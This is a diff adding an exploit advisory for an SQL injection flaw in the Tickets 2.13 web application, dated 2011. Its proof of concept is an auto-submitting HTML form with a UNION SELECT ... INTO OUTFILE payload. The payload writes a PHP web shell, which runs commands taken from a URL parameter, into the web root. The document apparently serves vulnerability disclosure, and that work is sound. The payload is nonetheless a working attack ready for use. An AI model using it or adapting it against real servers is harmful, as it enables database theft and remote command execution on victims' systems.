@@ -1,0 +1,30 @@
+<!------------------------------------------------------------------------
+# Software................Tickets 2.13
+# Vulnerability...........SQL Injection
+# Threat Level............Critical (4/5)
+# Download................http://www.ticketscad.org/
+# Discovery Date..........5/24/2011
+# Tested On...............Windows Vista + XAMPP
+# ------------------------------------------------------------------------
+# Author..................AutoSec Tools
+# Site....................http://www.autosectools.com/
+# Email...................John Leitch <john@autosectools.com>
+# ------------------------------------------------------------------------
+# 
+# 
+# --Description--
+# 
+# A sql injection vulnerability in Tickets 2.13 can be exploited to
+# extract arbitrary data. In some environments it may be possible to
+# create a PHP shell.
+# 
+# 
+# --PoC-->
+
+<html>
+ <body onload="document.forms[0].submit()"> 
+  <form method="POST" action="http://localhost/tickets/add_note.php">  
+   <input type="hidden" name="frm_ticket_id" value="0 UNION SELECT '<?php echo system($_GET["CMD"]); ?>','','','','','','','','','','','','','','','','','','','','','','','','','' FROM dual INTO OUTFILE '../../htdocs/shell.php';#" />   
+  </form>
+ </body>
+</html>
